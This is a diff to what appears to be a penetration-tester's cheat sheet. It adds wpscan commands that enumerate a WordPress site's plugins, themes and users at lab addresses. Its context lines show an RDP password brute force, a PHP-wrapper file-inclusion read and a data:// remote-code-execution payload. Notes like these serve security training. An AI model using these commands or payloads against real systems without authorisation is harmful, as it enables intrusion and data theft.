@@ -368,7 +368,6 @@ hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
    #+end_example
    
 ** HTTP
-   ADD: tool for enumeration of word-press sites
 
    gobuster directory mode
    #+begin_example
@@ -402,7 +401,28 @@ kiterunner scan http://192.168.243.143/api/ -w routes-small.kite -x 20
 curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../..//var/www/html/backup.php
 curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
    #+end_example
-  
+
+   ---------------------
+
+   enumerate wordpress sites
+
+   #+begin_example
+# default enumeration
+wpscan --url http://10.10.10.88/webservices/wp
+
+# enumerates vulnerable plugins
+wpscan --url http://10.10.10.88/webservices/wp --enumerate vp
+
+# enumerates all plugins
+wpscan --url http://10.10.10.88/webservices/wp --enumerate ap
+
+# enumerate all plugins using proxy
+wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap
+
+# enumerate everything
+wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
+   #+end_example
+   
 ** SMB
 
    nmap to get basic info
